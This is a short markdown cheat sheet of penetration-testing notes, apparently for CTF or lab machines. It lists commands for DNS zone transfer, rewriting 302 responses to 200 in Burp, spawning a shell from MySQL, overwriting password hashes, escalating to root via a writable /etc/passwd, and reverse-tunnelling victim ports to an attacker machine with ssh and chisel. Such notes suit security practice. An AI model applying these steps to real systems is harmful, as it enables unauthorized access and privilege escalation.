### Notes to look after:
- [DNS Stuffs](#dns)
- [302 Stuffs](#302)
- [Burp Stuffs](#burp)
- [Mysql Stuffs](#mysql)
- [Passwd Stuffs](#passwd)
- [Port Forwarding](#pd)
- [Linux Update/Upgrade Error](#error)


#### DNS Things:<a name='dns'></a>
- When DNS port is open on TCP, high chances of `zone transfer`<br />
`dig axfr domain.com @domain.com`


#### 302 Things:<a name='302'></a>
- When the status code is `302` which is redirect and has a size more than `1kb` then its fishy
- When `302` is found in the response heade, browser looks for the `location` header in the response and redirects there
- When the response form the server is intercepted and 302 is changed to `200 OK`
- The altered response processes and shows a new result than before


#### Burp Things:<a name='burp'></a>
- Automatically find and replace the response code with burp:
   - options -> Match and Replace -> Response Header -> Match: 30[12] FOUND; Replace: 200 OK -> â˜‘ï¸ Regex match -> ok 
   - This replaces 301 FOUND / 302 FOUND with 200 OK in the response header


#### MySQL Things:<a name='mysql'></a>
- When the creds for mysql is obtained, try to login 
  - `mysql -u <user> -p`
- After logging into mysql `\! /bin/sh` pops a shell (nice to give it a try)
- Enumerate the available tables: 
`select * from tables;`
- Enumerate values from  the table: 
`select * from tableName`
- Alter users password: 
 `update users set password = 'MySql_hash' where name='userName';`
 

#### Passwd Things:<a name='passwd'></a>
- When `write` permission for the passwd file is found
- Genereate a `crypt` passwd, which is standard unix algorithm
- In the passwd file, `root:x:0:0:root:/root:/bin/bash` replace the `x` with the openssl generated hash
- And su as root

#### Port Forwarding:<a name="pf"></a>
- Transferring a service running on a specific port on the compromized machine to attacker's machine
- Via SSH
```bash
# syntax: ssh -R remote_port:localhost:local_port ssh_server_hostname
ssh -R 80:localhost:8888 10.10.10.10

# syntax: ssh -N LOCAL_PORT:DESTINATION:DESTINATION_PORT [USER@]SSH_SERVER
# open a port on the atatckers machine
# to enter the ssh mode use "~C"
# ssh> -L {attackerMachinePort}:{victimMachine}:{victimPort} //victim machine mat be, 127.0.0.1 or an IP address that the compromized machine have access to
ssh -NL 8080:127.0.0.1:8080 10.10.10.10

```
- Via Chisel
```bash
# on the attacker machine
chisel server -p 9999 --reverse

# on the victim machine
chisel client 10.10.10.10:9999 R:443:127.0.0.1:443
```

#### Linux Update/Upgrade Error:<a name='error'></a>
```bash
sudo rm -rf /var/lib/apt/lists/*
sudo apt-get clean
sudo apt-get update
sudo apt-get upgrade
```

